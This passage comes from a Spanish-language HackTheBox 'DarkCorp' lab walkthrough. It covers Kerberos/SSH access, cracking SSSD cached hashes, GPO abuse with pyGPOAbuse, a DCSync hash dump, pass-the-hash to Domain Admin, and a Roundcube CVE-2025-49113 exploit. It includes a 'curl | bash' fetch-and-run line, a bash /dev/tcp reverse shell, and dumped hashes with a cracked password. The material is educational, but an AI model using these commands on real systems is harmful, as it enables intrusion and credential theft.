Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in angela.w.adm.ccache
❯ export KRB5CCNAME=$(pwd)/angela.w.adm.ccache
❯ klist
Ticket cache: FILE:/home/gzzcoo/Desktop/HackTheBox/Labs/Windows/AD/DarkCorp/content/angela.w.adm.ccache
Default principal: angela.w.adm@DARKCORP.HTB

Valid starting       Expires              Service principal
04/22/2025 18:17:04  04/23/2025 04:17:04  krbtgt/DARKCORP.HTB@DARKCORP.HTB
	renew until 04/23/2025 18:14:43
```

Para proseguir con el flujo de ataque, deberemos de configurar nuestro archivo `/etc/hosts` de la siguiente manera añadiendo la correspondiente entrada para que resuelva correctamente a `drip.darkcorp.htb`.

Por otro lado, ya que utilizaremos la autenticación `GSSAPI` en SSH, deberemos configurar el archivo `/etc/krb5.conf` con una configuración adecuada para que sepa donde se encuentra el `Key Distribution Center (KDC)`. Finalmente a través de `faketime` sincronizaremos nuestra hora con el Domain Controller para no tener problemas con `KRB_AP_ERR_SKEW`.

```bash
❯ cat /etc/hosts
127.0.0.1 localhost
127.0.0.1 nobody

10.10.11.54 drip.darkcorp.htb drip.htb
172.16.20.2 WEB-01.darkcorp.htb WEB-01
172.16.20.1 DC-01.darkcorp.htb DC-01 darkcorp.htb

❯ cat /etc/krb5.conf
[libdefaults]
	default_realm = DARKCORP.HTB
	dns_lookup_realm = true
	dns_lookup_kdc = true

[realms]
	DARKCORP.HTB = {
		kdc = darkcorp.htb
		admin_server = darkcorp.htb
	}

[domain_realm]
	.darkcorp.htb = DARKCORP.HTB
	darkcorp.htb = DARKCORP.HTB
	
❯ faketime "$(date +'%Y-%m-%d') $(net time -S 172.16.20.1 | awk '{print $4}')" zsh
```

---
### Abusing SSH Pass-the-Cert (PtC) through UPN Spoofing Attack

Ya que tenemos el TGT en nuestra variable `KRB5CCNAME`, nos autenticaremos al servidor SSH de `drip.darkcorp.htb`. Verificamos que hemos logrado acceder al servidor `drip` como el usuario `angela.w.adm` y disponemos de permisos de `sudo` en `(ALL : ALL) NOPASSWD: ALL`.

```bash
❯ ssh -K angela.w.adm@drip.darkcorp.htb
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr 22 10:37:33 2025 from 172.16.20.1
Could not chdir to home directory /home/darkcorp.htb/angela.w.adm: No such file or directory
angela.w.adm@drip:/$ hostname                                                                                                                                                                                                       
drip
angela.w.adm@drip:/$ id
uid=1730401107(angela.w.adm) gid=1730400513(domain users) groups=1730400513(domain users),1730401109(linux_admins)
angela.w.adm@drip:/$ sudo -l
Matching Defaults entries for angela.w.adm on drip:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User angela.w.adm may run the following commands on drip:
    (ALL : ALL) NOPASSWD: ALL
```

## Shell as taylor.b.adm on DC-01

### LinPEAS Enumeration

Realizaremos una enumeración en el sistema de Linux a través de la herramienta de `linPEAS` que compartiremos a través de un servidor web.

```bash
❯ ls -l /opt/PEASS/linpeas.sh
.rwxrwxr-x gzzcoo gzzcoo 820 KB Tue Apr  1 06:29:00 2025  /opt/PEASS/linpeas.sh
❯ python3 -m http.server 80 --directory /opt/PEASS
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde el equipo de `drip.darkcorp.htb` ejecutaremos un `curl` hacia la dirección IP donde tenemos nuestro `linpeas.sh` y lo ejecutaremos a través de una `bash`.

```bash
angela.w.adm@drip:/$ curl 10.10.16.9/linpeas.sh|bash
```

En el resultado obtenido verificamos la configuración de Kerberos que dispone el equipo `drip.darkcorp.htb`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_51.png)

---

### Abusing SSSD Privilege Escalation (manual and SSSD-creds)

Buscando alguna manera de escalar y movernos lateralmente desde un equipo Linux unido a un dominio de `Active Directory`, nos encontramos con los `SSSD`.

> `System Security Services Daemon (SSSD)` mantiene una copia de la base de datos en `/var/lib/sss/secrets/secrets.ldb`. La clave correspondiente se almacena en un archivo oculto en `/var/lib/sss/secrets/.secrets.mkey`. Por defecto, dicha clave solo es legible por usuarios con permisos `root`.
{: .prompt-info }

[https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/#ccache-ticket-reuse-from-sssd-kcm](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/#ccache-ticket-reuse-from-sssd-kcm)

Nos convertiremos en el usuario `root` y verificaremos la ruta indicada `/var/lib/sss/`.

```bash
angela.w.adm@drip:/$ sudo su
root@drip:/# ls -la /var/lib/sss/
total 40
drwxr-xr-x 10 root root 4096 Jan 10 11:51 .
drwxr-xr-x 42 root root 4096 Feb  3 14:27 ..
drwx------  2 root root 4096 Apr 22 10:41 db
drwxr-x--x  2 root root 4096 Jan 10 11:51 deskprofile
drwxr-xr-x  3 root root 4096 Jan 10 11:51 gpo_cache
drwx------  2 root root 4096 Jan 10 11:51 keytabs
drwxrwxr-x  2 root root 4096 Apr 22 07:10 mc
drwxr-xr-x  3 root root 4096 Apr 22 07:10 pipes
drwxr-xr-x  3 root root 4096 Apr 22 10:41 pubconf
drwx------  2 root root 4096 Jan 10 11:51 secrets
```

Accederemos a la ruta indicada y filtrando por los archivos `.ldb` nos quedaremos con los hashes que se almacenan en `SSSD`.

```bash
root@drip:/# cd /var/lib/sss/db/
root@drip:/var/lib/sss/db# strings *.ldb | grep '\$6\$'
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.
```

Una alternativa más automatizada es la del siguiente repositorio:

- [https://github.com/ricardojoserf/SSSD-creds](https://github.com/ricardojoserf/SSSD-creds)

Desde el equipo de `drip.darkcop.htb` nos pondremos en escucha para recibir el archivo `tdb.deb` que será necesario instalar en dicho equipo ya que por defecto no disponía y no tiene acceso a Internet para descargarlo.

```bash
root@drip:/tmp# nc -nlvp 443 > tdb.deb
listening on [any] 443 ...
```

Desde nuestro equipo de atacante, buscaremos por el binario `tdb-tools` y enviaremos a través de `/dev/tcp` el archivo al equipo `drip.darkcorp.htb` donde nos encontramos en escucha por el puerto `443`.

```bash
❯ apt download tdb-tools
❯ ls -l tdb-tools_2%3a1.4.13+samba4.22.0+dfsg-3_amd64.deb
.rw-r--r-- root root 60 KB Wed Apr  2 15:29:08 2025  tdb-tools_2%3a1.4.13+samba4.22.0+dfsg-3_amd64.deb
❯ bash -c "cat tdb-tools_2%3a1.4.13+samba4.22.0+dfsg-3_amd64.deb > /dev/tcp/172.16.20.3/443"
```

Verificaremos que hemos recibido correctamente el archivo y lo disponemos en el equipo `drip.darkcorp.htb`.

```bash
root@drip:/tmp# nc -nlvp 443 > tdb.deb
listening on [any] 443 ...
connect to [172.16.20.3] from (UNKNOWN) [172.16.20.3] 49766
root@drip:/tmp# ls -l tdb.deb 
-rw-r--r-- 1 root root 61344 Apr 22 11:01 tdb.deb// Some code
```

Mediante `dpkg` instalaremos el binario `tdb.tools` y comprobaremos que disponemos de la utilidad `tdbdump` localizada en el equipo victima.

```bash
root@drip:/tmp# dpkg -i tdb.deb
Selecting previously unselected package tdb-tools.
(Reading database ... 70049 files and directories currently installed.)
Preparing to unpack tdb.deb ...
Unpacking tdb-tools (2:1.4.13+samba4.22.0+dfsg-3) ...
dpkg: dependency problems prevent configuration of tdb-tools:
 tdb-tools depends on libc6 (>= 2.38); however:
  Version of libc6:amd64 on system is 2.36-9+deb12u9.

dpkg: error processing package tdb-tools (--install):
 dependency problems - leaving unconfigured
Processing triggers for man-db (2.11.2-2) ...
Errors were encountered while processing:
 tdb-tools
root@drip:/tmp# which tdbdump
/usr/bin/tdbdump
```

A continuación, ejecutaremos el script `analyze.sh` que nos proporciona el repositorio de GitHub y realizará una búsqueda de credenciales `SSSD`. En el resultado obtenido, verificamos que ha localizado un hash correspondiente al usuario `taylor.b.adm`.

```bash
root@drip:/tmp$ ./analyze.sh

### 1 hash found in /var/lib/sss/db/cache_darkcorp.htb.ldb ###

Account:	taylor.b.adm@darkcorp.htb
Hash:		$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.

  =====> Adding /var/lib/sss/db/cache_darkcorp.htb.ldb hashes to hashes.txt <=====


### 0 hash found in /var/lib/sss/db/config.ldb ###

### 0 hash found in /var/lib/sss/db/sssd.ldb ###

### 0 hash found in /var/lib/sss/db/timestamps_darkcorp.htb.ldb ###
```

### Cracking hashes

Nos guardaremos el hash obtenido en el punto anterior y a través de la herramienta de `John` intentaremos romper el hash. Finalmente logramos obtener las credenciales en texto plano del usuario `taylor.b.adm`.

```bash
❯ echo '$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.' > taylor.b.adm_hash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt taylor.b.adm_hash --format=sha512crypt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZzaq1         (?)     
1g 0:00:00:08 DONE (2025-04-22 19:08) 0.1210g/s 12149p/s 12149c/s 12149C/s Dominic1..paashaas
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
---
### Abusing WinRM - EvilWinRM

Si bien recordamos en la enumeración de `BloodHound`, el usuario `taylor.b.adm` lo habíamos indicado como un usuario `High Value` debido que a través de él podríamos intentar realizar un abuso de GPOs para lograr a ser `Domain Admin`.

Antes de nada, validaremos las credenciales de este nuevo usuario obtenido. Comprobamos que las credenciales del hash crackeado son válidas para dicho usuario y además disponemos de acceso a conectarnos por `WinRM` al `DC-01.darkcorp.htb`.

```bash
❯ nxc ldap 172.16.20.1 -u 'taylor.b.adm' -p '!QAZzaq1'
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 

❯ nxc winrm 172.16.20.1 -u 'taylor.b.adm' -p '!QAZzaq1'
WINRM       172.16.20.1     5985   DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
WINRM       172.16.20.1     5985   DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (Pwn3d!)

❯ evil-winrm -i 172.16.20.1 -u 'taylor.b.adm' -p '!QAZzaq1'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc` for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\taylor.b.adm\Documents> hostname
DC-01
```
----

## Privilege Escalation

### Abusing GPO Group to gain Local Administrator Access with pyGPOAbuse

Revisando nuevamente el path de `BloodHound`, nos encontramos bajo el contexto del usuario `taylor.b.adm@darkcorp.htb` el cual es miembro del grupo `GPO_MANAGER`. Los miembros de dicho grupo tienen permisos de `GenericWrite`, `WriteDacl` y `WriteOwner` sobre la GPO llamada `SECURITYUPDATES`.

Teniendo estos privilegios sobre una GPO, podríamos llegar a abusar para poder crear una tarea programada vinculada a una GPO maliciosa y obtener finalmente permisos de Local Admin en el equipo `DC-01`.

Para poder usar herramientas como `pyGPOAbuse`, necesitaremos el `GPO GUID` que lo podemos localizar desde el mismo `BloodHound`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_52.png)

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_53.png)

Mediante la herramienta de [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) nos autenticaremos con las credenciales del usuario `taylor.b.adm` que es el usuario que dispone los permisos necesarios sobre la GPO. Por otro lado, indicaremos cual es el GUID de la GPO la cual tenemos los permisos y le indicaremos el comando a ejecutar. En este caso, indicaremos que añada a este mismo usuario al grupo local de `Administrators` para ganar control sobre el Domain Controller.

Una vez ejecutado el comando, verificamos que se automatiza el proceso, se crea la tarea programada y finalmente el comando es ejecutado por detrás.

```bash
❯ python3 /opt/pyGPOAbuse/pygpoabuse.py darkcorp.htb/taylor.b.adm:'!QAZzaq1' -gpo-id '652CAE9A-4BB7-49F2-9E52-3361F33CE786' -dc-ip 172.16.20.1 -command 'net localgroup Administrators taylor.b.adm /add'
SUCCESS:root:ScheduledTask TASK_8bbd353e created!
[+] ScheduledTask TASK_8bbd353e created!
```

Desde la herramienta de `NetExec` ejecutaremos el comando `gpudpate /force` para forzar a la actualización de la `Policy`.

```bash
❯ nxc smb 172.16.20.1 -u 'taylor.b.adm' -p '!QAZzaq1' -x 'gpupdate /force'
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (Pwn3d!)
SMB         172.16.20.1     445    DC-01            [+] Executed command via wmiexec
SMB         172.16.20.1     445    DC-01            Updating policy...
SMB         172.16.20.1     445    DC-01            Computer Policy update has completed successfully.
SMB         172.16.20.1     445    DC-01            User Policy update has completed successfully.
```

Verificaremos si el usuario `taylor.b.adm` se encuentra dentro del grupo local `Administrators`. En el resultado obtenido mediante `NetExec`, verificamos que hemos conseguido abusar de la GPO y hemos logrado añadirnos como administradores locales del `DC-01.darkcorp.htb`.

```bash
❯ nxc smb 172.16.20.1 -u 'taylor.b.adm' -p '!QAZzaq1' -x 'net localgroup "Administrators"'
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1 (Pwn3d!)
SMB         172.16.20.1     445    DC-01            [+] Executed command via wmiexec
SMB         172.16.20.1     445    DC-01            Alias name     Administrators
SMB         172.16.20.1     445    DC-01            Comment        Administrators have complete and unrestricted access to the computer/domain
SMB         172.16.20.1     445    DC-01            Members
SMB         172.16.20.1     445    DC-01            -------------------------------------------------------------------------------
SMB         172.16.20.1     445    DC-01            Administrator
SMB         172.16.20.1     445    DC-01            Domain Admins
SMB         172.16.20.1     445    DC-01            Enterprise Admins
SMB         172.16.20.1     445    DC-01            taylor.b.adm
SMB         172.16.20.1     445    DC-01            The command completed successfully.
```

### Dumping NTDS.dit to obtain NT Domain Hash Administrator's

Ya que disponemos de local admin en el Domain Controller, realizaremos un `DCSync` para lograr realizar el dump de todos los hashes NTLM del dominio `darkcorp.htb`. Como resultado obtenido, verificamos todos los hashes NTLM incluyendo el del `Administrator` del dominio.

```bash
❯ impacket-secretsdump darkcorp.htb/taylor.b.adm:'!QAZzaq1'@172.16.20.1 -dc-ip 172.16.20.1 -just-dc-ntlm
Impacket v0.13.0.dev0+20250404.133223.00ced47f - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:8e20515750a27f7fc506ddfd1b0121bf:::
WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
[*] Cleaning up... 
```

### Shell as Domain Admin

Verificaremos nuevamente mediante `NetExec` de realizar `Pass-the-Hash (PtH)` con el hash NTLM del usuario `Administrator`. Comprobamos que las credenciales son válidas y nos encontramos como `Domain Admin`.

```bash
❯ nxc ldap 172.16.20.1 -u 'Administrator' -H 'fcb3ca5a19a1ccf2d14c13e8b64cde0f'
LDAP        172.16.20.1     389    DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)
LDAP        172.16.20.1     389    DC-01            [+] darkcorp.htb\Administrator:fcb3ca5a19a1ccf2d14c13e8b64cde0f (Pwn3d!)
```

Accederemos al Domain Controller realizando `Pass-the-Hash (PtH)` en `evil-winrm` y finalmente localizamos la flag `root.txt`.

```powershell
❯ evil-winrm -i 172.16.20.1 -u 'Administrator' -H 'fcb3ca5a19a1ccf2d14c13e8b64cde0f'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc` for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
49f35b9********************be018c
```

---
## Beyond Root

Después del lanzamiento de `DarkCorp`, apareció un nuevo `CVE-2025-49113` que provocaba obtener acceso como `www-data` en la primera máquina `drip.darkcorp.htb`.

[https://ccb.belgium.be/advisories/warning-critical-php-deserialization-vulnerability-roundcube-webmail-patch-immediately](https://ccb.belgium.be/advisories/warning-critical-php-deserialization-vulnerability-roundcube-webmail-patch-immediately)

> Esta vulnerabilidad se debe a una deserialización insegura de objetos PHP en la plataforma `Roundcube Webmail`. Los usuarios autenticados pueden aprovechar el fallo enviando un parámetro _from especialmente diseñado a `program/actions/settings/upload.php`. Este parámetro no se valida correctamente, lo que permite la manipulación de objetos PHP serializados para ejecutar código PHP arbitrario en el servidor.
{: .prompt-info }

```bash
❯ git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit; cd CVE-2025-49113-exploit                                    
Cloning into 'CVE-2025-49113-exploit'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 1), reused 9 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 442.35 KiB | 1.40 MiB/s, done.
Resolving deltas: 100% (1/1), done.
```

En nuestra terminal de atacante, nos pondremos en escucha para recibir la reverse shell.

```bash
❯ nc -nlvp 443                   
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
```

Ejecutaremos el exploit y le indicaremos el target que es la página donde está el `RoundCube` y nuestras credenciales de acceso y el comando a ejecutar, que será una reverse shell. Verificamos que según el script, el target es vulnerable, se ha podido autenticar y finalmente está realizando la explotación.

```bash
❯ php CVE-2025-49113.php http://mail.drip.htb gzzcoo Gzzcoo123 '/bin/bash -c "bash -i >& /dev/tcp/10.10.16.9/443 0>&1"'
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10607
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```

Verificamos que finalmente se ha logrado obtener acceso como `www-data` en el equipo `drip`. Esto permite que la intrusión de la máquina se pueda realizar un `skip` y directamente obtener una shell bajo el contexto del usuario `www-data`.

```bash
❯ nc -nlvp 443                   
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.54.
Ncat: Connection from 10.10.11.54:51236.
bash: cannot set terminal process group (503): Inappropriate ioctl for device
bash: no job control in this shell
www-data@drip:/$
```


> _Happy hacking :)_